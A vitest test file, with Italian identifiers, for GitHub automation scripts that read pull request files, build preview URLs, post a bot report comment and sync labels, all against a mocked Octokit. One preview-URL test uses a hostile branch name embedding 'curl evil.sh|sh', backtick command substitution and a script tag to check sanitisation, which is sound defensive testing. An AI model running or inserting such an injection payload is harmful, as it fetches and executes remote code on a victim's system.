import { describe, expect, it } from 'vitest';
import {
  CONTROLLI_OBBLIGATORI,
  ETICHETTA_LIVELLO_1,
  LIMITE_CORPO,
  VerificaNonPossibile,
  fetchPullRequest,
  fetchPullRequestInput,
  limitaCorpo,
  previewUrl,
  sincronizzaEtichetta,
  upsertReport,
} from '../../scripts/autonomia/github';
import { MARCATORE } from '../../scripts/autonomia/report';
import { ETICHETTA_INVIATA, HOME, NEGOZIO, negozioJson, rules } from './fixtures';
import {
  BASE_SHA,
  HEAD_SHA,
  chiave,
  creaOctokitFinto,
  erroreHttp,
  quante,
  type ScenarioFinto,
} from './octokitFinto';

const ref = { owner: 'eusebjo', repo: 'alma-living', pullNumber: 7 };
const FOTO = 'src/content/pagine/immagini/foto.webp';
const GERGO = /branch|merge|commit/i;

/** Proposta della redazione (`lei`) già inviata per la revisione. */
const dellaRedazione = (scenario: ScenarioFinto): ScenarioFinto => ({
  autore: 'lei',
  etichette: [ETICHETTA_INVIATA],
  ...scenario,
});

describe('fetchPullRequestInput', () => {
  it('mappa pulls.get e pulls.listFiles su PullRequestInput', async () => {
    const prima = negozioJson();
    const dopo = negozioJson((n) => {
      n.descrizione = 'Nuova descrizione.';
    });
    const { octokit, chiamate } = creaOctokitFinto(
      dellaRedazione({
        etichette: [ETICHETTA_INVIATA, 'altra'],
        files: [{ filename: NEGOZIO, status: 'modified' }],
        contenuti: {
          [chiave(BASE_SHA, NEGOZIO)]: { testo: prima },
          [chiave(HEAD_SHA, NEGOZIO)]: { testo: dopo },
        },
      }),
    );

    const input = await fetchPullRequestInput(octokit, ref, rules);

    expect(input).toEqual({
      author: 'lei',
      draft: false,
      labels: [ETICHETTA_INVIATA, 'altra'],
      files: [
        {
          path: NEGOZIO,
          status: 'modified',
          before: prima,
          after: dopo,
          sizeBytes: Buffer.byteLength(dopo),
        },
      ],
    });
    expect(chiamate.find((c) => c.metodo === 'pulls.get')?.params).toEqual({
      owner: 'eusebjo',
      repo: 'alma-living',
      pull_number: 7,
    });
  });

  it('legge `before` dal ramo di base e `after` dalla testata', async () => {
    const { octokit, chiamate } = creaOctokitFinto(
      dellaRedazione({
        files: [{ filename: HOME, status: 'modified' }],
        contenuti: {
          [chiave(BASE_SHA, HOME)]: { testo: 'prima' },
          [chiave(HEAD_SHA, HOME)]: { testo: 'dopo' },
        },
      }),
    );

    await fetchPullRequestInput(octokit, ref, rules);

    const letture = chiamate
      .filter((c) => c.metodo === 'repos.getContent')
      .map((c) => c.params);
    expect(letture).toEqual(
      expect.arrayContaining([
        { owner: 'eusebjo', repo: 'alma-living', path: HOME, ref: BASE_SHA },
        { owner: 'eusebjo', repo: 'alma-living', path: HOME, ref: HEAD_SHA },
      ]),
    );
    expect(letture).toHaveLength(2);
  });

  it('un file aggiunto ha before null; uno rimosso ha after null', async () => {
    const { octokit, chiamate } = creaOctokitFinto(
      dellaRedazione({
        files: [
          { filename: 'src/content/pagine/nuova.md', status: 'added' },
          { filename: HOME, status: 'removed' },
        ],
        contenuti: {
          [chiave(HEAD_SHA, 'src/content/pagine/nuova.md')]: { testo: 'nuova' },
          [chiave(BASE_SHA, HOME)]: { testo: 'vecchia' },
        },
      }),
    );

    const { files } = await fetchPullRequestInput(octokit, ref, rules);

    expect(files[0]).toMatchObject({ status: 'added', before: null, after: 'nuova' });
    expect(files[1]).toMatchObject({ status: 'removed', before: 'vecchia', after: null });
    // Nessuna lettura inutile: niente base per l'aggiunto, niente testata per il rimosso.
    const refLetti = chiamate
      .filter((c) => c.metodo === 'repos.getContent')
      .map((c) => `${String(c.params.ref).slice(0, 1)}:${String(c.params.path)}`);
    expect(refLetti.sort()).toEqual(
      [`a:src/content/pagine/nuova.md`, `b:${HOME}`].sort(),
    );
  });

  it('previousPath viene da previous_filename e before dal vecchio percorso', async () => {
    const nuovo = 'src/content/pagine/chi-siamo.md';
    const { octokit } = creaOctokitFinto(
      dellaRedazione({
        files: [{ filename: nuovo, status: 'renamed', previous_filename: HOME }],
        contenuti: {
          [chiave(BASE_SHA, HOME)]: { testo: 'testo' },
          [chiave(HEAD_SHA, nuovo)]: { testo: 'testo' },
        },
      }),
    );

    const { files } = await fetchPullRequestInput(octokit, ref, rules);

    expect(files).toEqual([
      {
        path: nuovo,
        status: 'renamed',
        previousPath: HOME,
        before: 'testo',
        after: 'testo',
        sizeBytes: 5,
      },
    ]);
  });

  it('pagina pulls.listFiles finché ci sono file', async () => {
    const molti = Array.from({ length: 250 }, (_, i) => ({
      filename: `docs/file-${i}.md`,
      status: 'modified',
    }));
    const { octokit, chiamate } = creaOctokitFinto({
      autore: 'eusebjo',
      files: molti,
    });

    const { files } = await fetchPullRequestInput(octokit, ref, rules);

    expect(files).toHaveLength(250);
    expect(files[249]?.path).toBe('docs/file-249.md');
    const pagine = chiamate
      .filter((c) => c.metodo === 'pulls.listFiles')
      .map((c) => [c.params.page, c.params.per_page]);
    expect(pagine).toEqual([
      [1, 100],
      [2, 100],
      [3, 100],
    ]);
  });

  describe('file media', () => {
    it('imposta sizeBytes dalla risposta di getContent senza leggere il contenuto', async () => {
      const { octokit, chiamate, stato } = creaOctokitFinto(
        dellaRedazione({
          files: [{ filename: FOTO, status: 'added' }],
          contenuti: { [chiave(HEAD_SHA, FOTO)]: { testo: 'x', size: 123_456 } },
        }),
      );

      const { files } = await fetchPullRequestInput(octokit, ref, rules);

      expect(files).toEqual([
        { path: FOTO, status: 'added', before: null, after: null, sizeBytes: 123_456 },
      ]);
      expect(stato.letturaContenuto).toBe(0);
      expect(quante(chiamate, 'repos.getContent')).toBe(1);
    });

    it('per un media modificato non legge nemmeno la versione di base', async () => {
      const { octokit, chiamate, stato } = creaOctokitFinto(
        dellaRedazione({
          files: [{ filename: FOTO, status: 'modified' }],
          contenuti: {
            [chiave(BASE_SHA, FOTO)]: { size: 10 },
            [chiave(HEAD_SHA, FOTO)]: { size: 2_500_000 },
          },
        }),
      );

      const { files } = await fetchPullRequestInput(octokit, ref, rules);

      expect(files[0]).toMatchObject({ before: null, after: null, sizeBytes: 2_500_000 });
      expect(chiamate.filter((c) => c.metodo === 'repos.getContent')).toHaveLength(1);
      expect(stato.letturaContenuto).toBe(0);
    });

    it('un media rimosso non richiede nessuna lettura', async () => {
      const { octokit, chiamate } = creaOctokitFinto(
        dellaRedazione({ files: [{ filename: FOTO, status: 'removed' }] }),
      );

      const { files } = await fetchPullRequestInput(octokit, ref, rules);

      expect(files[0]).toMatchObject({ status: 'removed', before: null, after: null });
      expect(quante(chiamate, 'repos.getContent')).toBe(0);
    });

    it('se la dimensione manca lascia sizeBytes indefinito (evaluate respinge)', async () => {
      const { octokit } = creaOctokitFinto(
        dellaRedazione({
          files: [{ filename: FOTO, status: 'added' }],
          // Nessun contenuto: la testata risponde 404.
        }),
      );

      const { files } = await fetchPullRequestInput(octokit, ref, rules);

      expect(files[0]?.sizeBytes).toBeUndefined();
    });
  });

  describe('file che non sono file normali', () => {
    it.each(['symlink', 'submodule', 'directory'] as const)(
      'un %s alla testata è segnalato e il suo contenuto non viene usato',
      async (tipo) => {
        const { octokit } = creaOctokitFinto(
          dellaRedazione({
            files: [
              { filename: HOME, status: 'modified' },
              { filename: FOTO, status: 'added' },
            ],
            contenuti: {
              [chiave(BASE_SHA, HOME)]: { testo: 'prima' },
              [chiave(HEAD_SHA, HOME)]: { tipo, testo: 'dopo' },
              [chiave(HEAD_SHA, FOTO)]: { tipo, size: 20 },
            },
          }),
        );

        const { input, bloccati } = await fetchPullRequest(octokit, ref, rules);

        expect(input.files[0]).toMatchObject({ before: 'prima', after: null });
        expect(input.files[0]?.sizeBytes).toBeUndefined();
        expect(input.files[1]?.sizeBytes).toBeUndefined();
        expect(bloccati.map((b) => b.file)).toEqual([HOME, FOTO]);
        for (const blocco of bloccati) {
          expect(blocco.azione).toBe('perimetro');
          expect(blocco.messaggio).toMatch(/collegamento|non è un file/i);
          expect(blocco.messaggio).not.toMatch(GERGO);
        }
      },
    );

    it('un file normale non genera segnalazioni', async () => {
      const { octokit } = creaOctokitFinto(
        dellaRedazione({
          files: [{ filename: HOME, status: 'modified' }],
          contenuti: {
            [chiave(BASE_SHA, HOME)]: { testo: 'prima' },
            [chiave(HEAD_SHA, HOME)]: { testo: 'dopo' },
          },
        }),
      );

      expect((await fetchPullRequest(octokit, ref, rules)).bloccati).toEqual([]);
    });
  });

  describe('elenco dei file completo', () => {
    it('fallisce se GitHub dichiara più file di quelli elencati', async () => {
      const { octokit } = creaOctokitFinto({
        autore: 'eusebjo',
        files: [{ filename: 'README.md', status: 'modified' }],
        fileDichiarati: 5,
      });

      const promessa = fetchPullRequestInput(octokit, ref, rules);

      await expect(promessa).rejects.toBeInstanceOf(VerificaNonPossibile);
      await expect(promessa).rejects.toThrow(/tutti i file/i);
      await expect(promessa).rejects.not.toThrow(GERGO);
    });

    it('si ferma a 3.000 file (limite di GitHub) e poi fallisce', async () => {
      const troppi = Array.from({ length: 3000 }, (_, i) => ({
        filename: `docs/${i}.md`,
        status: 'added',
      }));
      const { octokit, chiamate } = creaOctokitFinto({
        autore: 'eusebjo',
        files: troppi,
        fileDichiarati: 3500,
      });

      await expect(fetchPullRequestInput(octokit, ref, rules)).rejects.toBeInstanceOf(
        VerificaNonPossibile,
      );
      expect(quante(chiamate, 'pulls.listFiles')).toBe(30);
    });

    it('fallisce se GitHub non dichiara quanti file ci sono', async () => {
      const { octokit } = creaOctokitFinto({
        autore: 'eusebjo',
        files: [{ filename: 'README.md', status: 'modified' }],
        fileDichiarati: null,
      });

      await expect(fetchPullRequestInput(octokit, ref, rules)).rejects.toBeInstanceOf(
        VerificaNonPossibile,
      );
    });

    it("fallisce se l'elenco dei file non si riesce a leggere", async () => {
      const { octokit } = creaOctokitFinto({
        autore: 'eusebjo',
        errori: { 'pulls.listFiles': erroreHttp(502) },
      });

      await expect(fetchPullRequestInput(octokit, ref, rules)).rejects.toMatchObject({
        status: 502,
      });
    });

    it('una proposta senza file è un elenco valido (la decisione spetta a chi valuta)', async () => {
      const { octokit } = creaOctokitFinto({ autore: 'eusebjo', files: [] });

      const { files } = await fetchPullRequestInput(octokit, ref, rules);

      expect(files).toEqual([]);
    });
  });

  describe('lettura dei contenuti', () => {
    it('se un contenuto non esiste (404) lo segna come illeggibile e non fallisce', async () => {
      const { octokit } = creaOctokitFinto(
        dellaRedazione({
          files: [{ filename: HOME, status: 'modified' }],
          contenuti: { [chiave(BASE_SHA, HOME)]: { testo: 'prima' } },
        }),
      );

      const { files } = await fetchPullRequestInput(octokit, ref, rules);

      expect(files[0]).toMatchObject({ before: 'prima', after: null });
    });

    it('un errore diverso da 404 interrompe il controllo', async () => {
      const { octokit } = creaOctokitFinto(
        dellaRedazione({
          files: [{ filename: HOME, status: 'modified' }],
          contenuti: {
            [chiave(BASE_SHA, HOME)]: { testo: 'prima' },
            [chiave(HEAD_SHA, HOME)]: erroreHttp(403, 'rate limit'),
          },
        }),
      );

      await expect(fetchPullRequestInput(octokit, ref, rules)).rejects.toMatchObject({
        status: 403,
      });
    });

    it('un file troppo grande per l’API (contenuto non incluso) vale come illeggibile', async () => {
      const { octokit } = creaOctokitFinto(
        dellaRedazione({
          files: [{ filename: HOME, status: 'modified' }],
          contenuti: {
            [chiave(BASE_SHA, HOME)]: { testo: 'prima' },
            [chiave(HEAD_SHA, HOME)]: { troppoGrande: true, size: 3_000_000 },
          },
        }),
      );

      const { files } = await fetchPullRequestInput(octokit, ref, rules);

      expect(files[0]?.after).toBeNull();
    });

    it("l'autore si confronta senza distinguere maiuscole e minuscole", async () => {
      const { octokit, chiamate } = creaOctokitFinto(
        dellaRedazione({
          autore: 'LEI',
          files: [{ filename: HOME, status: 'added' }],
          contenuti: { [chiave(HEAD_SHA, HOME)]: { testo: 'x' } },
        }),
      );

      await fetchPullRequestInput(octokit, ref, rules);

      expect(quante(chiamate, 'repos.getContent')).toBe(1);
    });

    it.each([
      ['sviluppo', { autore: 'eusebjo', etichette: [] }],
      ['autore sconosciuto', { autore: 'estraneo', etichette: [] }],
      ['bozza', { bozza: true }],
      ['proposta non inviata', { etichette: [] }],
    ])(
      'non legge i contenuti quando evaluate non li usa (%s)',
      async (_nome, scenario) => {
        const { octokit, chiamate } = creaOctokitFinto(
          dellaRedazione({
            ...scenario,
            files: [
              { filename: HOME, status: 'modified' },
              { filename: FOTO, status: 'added' },
            ],
          }),
        );

        const { files } = await fetchPullRequestInput(octokit, ref, rules);

        expect(quante(chiamate, 'repos.getContent')).toBe(0);
        expect(files.map((f) => f.path)).toEqual([HOME, FOTO]);
      },
    );

    it('passa invariati gli stati che evaluate non conosce (copied, changed)', async () => {
      const { octokit } = creaOctokitFinto(
        dellaRedazione({ files: [{ filename: HOME, status: 'copied' }] }),
      );

      const { files } = await fetchPullRequestInput(octokit, ref, rules);

      expect(files[0]?.status).toBe('copied');
    });
  });

  describe('ramo della proposta', () => {
    it('è il ramo di testata se sta nello stesso repository', async () => {
      const { octokit } = creaOctokitFinto({ autore: 'eusebjo', ramo: 'fase1/2-anteprime' });

      expect((await fetchPullRequest(octokit, ref, rules)).ramo).toBe('fase1/2-anteprime');
    });

    it.each([
      ['un fork', { repoTestata: 'altro/alma-living' }],
      ['un repository cancellato', { repoTestata: null }],
    ])('è null se la proposta arriva da %s', async (_nome, scenario) => {
      const { octokit } = creaOctokitFinto({ autore: 'eusebjo', ...scenario });

      expect((await fetchPullRequest(octokit, ref, rules)).ramo).toBeNull();
    });
  });
});

describe('previewUrl', () => {
  it.each([
    ['fase1/2-anteprime', 'https://fase1-2-anteprime-alma-living.sebjomuho.workers.dev/'],
    ['cms/pagine/home', 'https://cms-pagine-home-alma-living.sebjomuho.workers.dev/'],
    ['Fase1/Titolo_Maiuscolo.v2', 'https://fase1-titolo-maiuscolo-v2-alma-living.sebjomuho.workers.dev/'],
    ['a///b__c..d', 'https://a-b-c-d-alma-living.sebjomuho.workers.dev/'],
    ['--bordi--', 'https://bordi-alma-living.sebjomuho.workers.dev/'],
    ['/inizio/e/fine/', 'https://inizio-e-fine-alma-living.sebjomuho.workers.dev/'],
    ['perché/città', 'https://perch-citt-alma-living.sebjomuho.workers.dev/'],
  ])('%s -> %s', (ramo, atteso) => {
    expect(previewUrl(ramo)).toBe(atteso);
  });

  it('neutralizza i caratteri pericolosi di un nome di ramo ostile', () => {
    const url = previewUrl('x$(curl evil.sh|sh);`id`&&"><script>/../..');
    expect(url).toMatch(/^https:\/\/[a-z0-9-]+-alma-living\.sebjomuho\.workers\.dev\/$/);
    expect(url).not.toMatch(/[$();`&"<>|\s]/);
  });

  it("restituisce una stringa vuota se del nome non resta nulla", () => {
    expect(previewUrl('///')).toBe('');
    expect(previewUrl('')).toBe('');
    expect(previewUrl('èèè')).toBe('');
  });
});

describe('limitaCorpo', () => {
  it('lascia invariato un testo entro il limite', () => {
    const testo = `${MARCATORE}\n\nTutto bene.\n`;
    expect(limitaCorpo(testo)).toBe(testo);
  });

  it('accorcia un testo troppo lungo tenendo il marcatore all’inizio e una nota in italiano', () => {
    const righe = Array.from({ length: 5000 }, (_, i) => `- voce ${i}: ${'x'.repeat(40)}`);
    const testo = `${MARCATORE}\n\n## Titolo\n\n${righe.join('\n')}\n`;

    const corto = limitaCorpo(testo);

    expect(corto.length).toBeLessThanOrEqual(LIMITE_CORPO);
    expect(corto.startsWith(`${MARCATORE}\n`)).toBe(true);
    expect(corto).toMatch(/elenco è stato accorciato/i);
    expect(corto).not.toMatch(GERGO);
    // Il taglio avviene a fine riga: ogni voce rimasta è intera.
    const rimaste = corto.split('\n').filter((r) => r.startsWith('- voce '));
    expect(rimaste.length).toBeGreaterThan(100);
    for (const riga of rimaste) expect(riga).toMatch(/^- voce \d+: x{40}$/);
  });

  it('rispetta un limite più stretto e resta sotto i 65.536 caratteri di GitHub', () => {
    const testo = `${MARCATORE}\n${'a'.repeat(200_000)}`;

    expect(limitaCorpo(testo, 1000).length).toBeLessThanOrEqual(1000);
    expect(limitaCorpo(testo).length).toBeLessThan(65_536);
    expect(LIMITE_CORPO).toBeLessThan(65_536);
  });

  it('non spezza una coppia di surrogati se non ci sono righe', () => {
    const testo = `${MARCATORE}\n${'😀'.repeat(50_000)}`;

    const corto = limitaCorpo(testo, 2001);

    expect(corto.length).toBeLessThanOrEqual(2001);
    // Nessun surrogato isolato: la stringa si riscrive identica in UTF-8.
    expect(Buffer.from(corto, 'utf8').toString('utf8')).toBe(corto);
  });
});

describe('upsertReport', () => {
  const bot = { login: 'github-actions[bot]', type: 'Bot' };

  it('crea il commento se non esiste', async () => {
    const { octokit, chiamate, stato } = creaOctokitFinto({
      commenti: [{ id: 1, body: 'Un commento qualunque.', user: { login: 'lei', type: 'User' } }],
    });
    const corpo = `${MARCATORE}\n\nEsito.\n`;

    await upsertReport(octokit, ref, corpo);

    expect(quante(chiamate, 'issues.updateComment')).toBe(0);
    expect(chiamate.find((c) => c.metodo === 'issues.createComment')?.params).toEqual({
      owner: 'eusebjo',
      repo: 'alma-living',
      issue_number: 7,
      body: corpo,
    });
    expect(stato.commenti).toHaveLength(2);
  });

  it('aggiorna il commento che inizia con il marcatore invece di crearne un altro', async () => {
    const { octokit, chiamate, stato } = creaOctokitFinto({
      commenti: [
        { id: 1, body: 'Ciao', user: { login: 'lei', type: 'User' } },
        { id: 2, body: `${MARCATORE}\n\nVecchio esito.\n`, user: bot },
      ],
    });
    const corpo = `${MARCATORE}\n\nNuovo esito.\n`;

    await upsertReport(octokit, ref, corpo);

    expect(quante(chiamate, 'issues.createComment')).toBe(0);
    expect(chiamate.find((c) => c.metodo === 'issues.updateComment')?.params).toEqual({
      owner: 'eusebjo',
      repo: 'alma-living',
      comment_id: 2,
      body: corpo,
    });
    expect(stato.commenti[1]?.body).toBe(corpo);
  });

  it('cerca il commento anche nelle pagine successive', async () => {
    const riempitivo = Array.from({ length: 100 }, (_, i) => ({
      id: i + 1,
      body: `commento ${i}`,
      user: { login: 'lei', type: 'User' },
    }));
    const { octokit, chiamate } = creaOctokitFinto({
      commenti: [...riempitivo, { id: 500, body: `${MARCATORE}\nvecchio`, user: bot }],
    });

    await upsertReport(octokit, ref, `${MARCATORE}\nnuovo`);

    expect(quante(chiamate, 'issues.listComments')).toBe(2);
    expect(chiamate.find((c) => c.metodo === 'issues.updateComment')?.params).toMatchObject({
      comment_id: 500,
    });
  });

  it('ignora i commenti scritti da persone che imitano il marcatore', async () => {
    const { octokit, chiamate } = creaOctokitFinto({
      commenti: [
        { id: 1, body: `${MARCATORE}\nfinto`, user: { login: 'estraneo', type: 'User' } },
      ],
    });

    await upsertReport(octokit, ref, `${MARCATORE}\nvero`);

    expect(quante(chiamate, 'issues.updateComment')).toBe(0);
    expect(quante(chiamate, 'issues.createComment')).toBe(1);
  });

  it('ignora un marcatore che non è all’inizio del commento', async () => {
    const { octokit, chiamate } = creaOctokitFinto({
      commenti: [{ id: 1, body: `Guarda ${MARCATORE}`, user: bot }],
    });

    await upsertReport(octokit, ref, `${MARCATORE}\nvero`);

    expect(quante(chiamate, 'issues.createComment')).toBe(1);
  });

  it('accorcia un rapporto troppo lungo prima di inviarlo (GitHub rifiuta oltre 65.536 caratteri)', async () => {
    const { octokit, stato } = creaOctokitFinto();
    const enorme = `${MARCATORE}\n\n${Array.from({ length: 3000 }, (_, i) => `- file ${i}: ${'y'.repeat(150)}`).join('\n')}\n`;
    expect(enorme.length).toBeGreaterThan(65_536);

    await upsertReport(octokit, ref, enorme);

    const inviato = stato.commenti[0]?.body ?? '';
    expect(inviato.length).toBeLessThanOrEqual(LIMITE_CORPO);
    expect(inviato.startsWith(`${MARCATORE}\n`)).toBe(true);
    expect(inviato).toMatch(/accorciato/);
  });

  it('rifiuta un corpo che non inizia con il marcatore', async () => {
    const { octokit, chiamate } = creaOctokitFinto();

    await expect(upsertReport(octokit, ref, 'Senza marcatore')).rejects.toThrow(
      /marcatore/i,
    );
    expect(chiamate).toHaveLength(0);
  });
});

describe('sincronizzaEtichetta', () => {
  it("aggiunge l'etichetta e la crea prima se non esiste ancora", async () => {
    const { octokit, chiamate, stato: s } = creaOctokitFinto({ etichette: [] });

    await sincronizzaEtichetta(octokit, ref, ETICHETTA_LIVELLO_1, true, false);

    expect(chiamate.map((c) => c.metodo)).toEqual([
      'issues.getLabel',
      'issues.createLabel',
      'issues.addLabels',
    ]);
    const creata = chiamate.find((c) => c.metodo === 'issues.createLabel')?.params;
    expect(creata).toMatchObject({ name: ETICHETTA_LIVELLO_1 });
    expect(String(creata?.description)).toMatch(/approvazione/i);
    expect(String(creata?.description)).not.toMatch(GERGO);
    expect(s.etichette).toEqual([ETICHETTA_LIVELLO_1]);
  });

  it("non ricrea un'etichetta che esiste già", async () => {
    const { octokit, chiamate } = creaOctokitFinto({
      etichetteDelRepo: [ETICHETTA_LIVELLO_1],
    });

    await sincronizzaEtichetta(octokit, ref, ETICHETTA_LIVELLO_1, true, false);

    expect(quante(chiamate, 'issues.createLabel')).toBe(0);
    expect(quante(chiamate, 'issues.addLabels')).toBe(1);
  });

  it('tollera una creazione concorrente (422, esiste già)', async () => {
    const { octokit, chiamate } = creaOctokitFinto({
      errori: { 'issues.createLabel': erroreHttp(422, 'already_exists') },
    });

    await sincronizzaEtichetta(octokit, ref, ETICHETTA_LIVELLO_1, true, false);

    expect(quante(chiamate, 'issues.addLabels')).toBe(1);
  });

  it('non fa nulla se la proposta ha già (o non ha) l’etichetta giusta', async () => {
    const aggiunta = creaOctokitFinto({ etichette: [ETICHETTA_LIVELLO_1] });
    await sincronizzaEtichetta(aggiunta.octokit, ref, ETICHETTA_LIVELLO_1, true, true);
    expect(aggiunta.chiamate).toHaveLength(0);

    const tolta = creaOctokitFinto();
    await sincronizzaEtichetta(tolta.octokit, ref, ETICHETTA_LIVELLO_1, false, false);
    expect(tolta.chiamate).toHaveLength(0);
  });

  it("toglie l'etichetta se è presente, e tollera che sia già sparita (404)", async () => {
    const { octokit, stato: s } = creaOctokitFinto({ etichette: [ETICHETTA_LIVELLO_1] });
    await sincronizzaEtichetta(octokit, ref, ETICHETTA_LIVELLO_1, false, true);
    expect(s.etichette).toEqual([]);

    // La proposta credeva di averla, ma nel frattempo qualcuno l'ha tolta.
    await expect(
      sincronizzaEtichetta(octokit, ref, ETICHETTA_LIVELLO_1, false, true),
    ).resolves.toBeUndefined();
  });

  it('un errore diverso da 404 non viene nascosto', async () => {
    const { octokit } = creaOctokitFinto({
      errori: { 'issues.getLabel': erroreHttp(403, 'Resource not accessible') },
    });

    await expect(
      sincronizzaEtichetta(octokit, ref, ETICHETTA_LIVELLO_1, true, false),
    ).rejects.toMatchObject({ status: 403 });
  });
});

describe('nomi dei controlli obbligatori', () => {
  it('sono build e verifica-autonomia', () => {
    expect([...CONTROLLI_OBBLIGATORI]).toEqual(['build', 'verifica-autonomia']);
    expect(ETICHETTA_LIVELLO_1).toBe('livello-1-serve-approvazione');
  });
});
